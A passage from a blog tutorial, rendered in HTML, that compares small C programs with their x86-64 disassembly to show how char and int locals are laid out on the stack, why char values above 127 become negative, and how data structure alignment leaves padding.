</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">129</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>disassembly for this code:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="p">-</span><span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-3</span><span class="p">],</span> <span class="p">-</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="p">-</span><span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Good, now we also know how <code>int</code> and <code>char</code> looks like in their disassembly output. Let&rsquo;s mix things up a bit to level up and learn something new.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">129</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">131</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>4 <code>char</code> and then 1 <code>int</code>.</p>
<ul>
<li><code>rbp-1</code> for <code>a</code>.</li>
<li><code>rbp-2</code> for <code>b</code>.</li>
<li><code>rbp-3</code> for <code>c</code>.</li>
<li><code>rbp-4</code> for <code>d</code>.</li>
<li><code>rbp-8</code> for <code>e</code>. Because int takes 4 bytes (This can depend on the OS, architecture and compiler you are using).</li>
</ul>
<p>Let&rsquo;s check the disassembly to see if we got this right or not.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="p">-</span><span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-3</span><span class="p">],</span> <span class="p">-</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="p">-</span><span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">131</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Woohooo!!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/xT1Ra6fhiJdvL7A8hi/giphy.gif#center" alt=""  />
</p>
<p>Though there is one thing I want you to notice&hellip; The <code>int</code> value did not follow the same pattern as <code>char</code> values because <code>char</code> is smaller in size and cannot store a very large value, whereas <code>int</code> is comparatively larger and can store the assigned value without any storage issues. As a result, the <code>int</code> value remained unchanged from the source code, while the <code>char</code> values became negative.</p>
<p>Now, let&rsquo;s change the order of the variables and see how it gets interesting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">131</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">129</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>disassembly for this code:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="p">-</span><span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">131</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-9</span><span class="p">],</span> <span class="p">-</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-10</span><span class="p">],</span> <span class="p">-</span><span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Well, you can see the size needed for each variable has changed. It&rsquo;s time to be aware of a concept called <a href="https://en.wikipedia.org/wiki/Data_structure_alignment"><strong>Data structure alignment</strong></a>.</p>
<p>According to wikipedia,</p>
<blockquote>
<p>The CPU in modern computer hardware performs reads and writes to memory most efficiently when the data is naturally aligned, which generally means that the data&rsquo;s memory address is a multiple of the data size. For instance, in a 32-bit architecture, the data may be aligned if the data is stored in four consecutive bytes and the first byte lies on a 4-byte boundary.</p>
</blockquote>
<p>Read <a href="https://developer.ibm.com/articles/pa-dalign/">this article</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> to gain better understanding of data alignment and why is it even a concerning thing for us.</p>
<p>For now, just know that usually 64-bit CPUs have a native 4-byte load. That means, it can pick up 4 bytes in a single turn and use them for something.</p>
<p>Let&rsquo;s visualize the memory layout for the variables in above code.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 240 393"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='32' y='68' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='132' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='32' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='196' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='32' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='260' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='32' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='32' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='40' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='48' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='228' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='48' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='372' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='56' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='100' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='56' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='228' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='56' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='64' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='100' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='64' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='228' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='64' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='228' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='72' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='132' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='80' y='196' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='80' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='260' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='80' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='80' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='100' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='96' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='228' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='96' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='96' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='104' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='104' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='228' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='104' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='100' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='112' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='228' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='112' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='4' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='100' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='120' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='164' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='120' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='228' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='120' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='128' y='164' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='128' y='196' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='128' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='260' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='128' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='164' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='136' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='144' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='176' y='196' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='184' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>The above diagram of memory is aligned in a 4 byte load. The first 2 variables are a <code>BYTE</code> type so the values are places in the first 2 blocks of the first row. Next variable is an <code>INT</code> type, which is equivalent to 4 bytes. But there are no 4 bytes available in the first row, so in order to keep the atomicity, this variable was stored in the next row. <em>(<a href="https://stackoverflow.com/questions/36624881/why-is-integer-assignment-on-a-naturally-aligned-variable-atomic-on-x86">WHY atomicity??</a>)</em></p>
<p>So does it mean that we have that 2 bytes space just lying there?? - YES! you can use it if you want. Take a look at the below source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">112</span><span class="p">;</span>
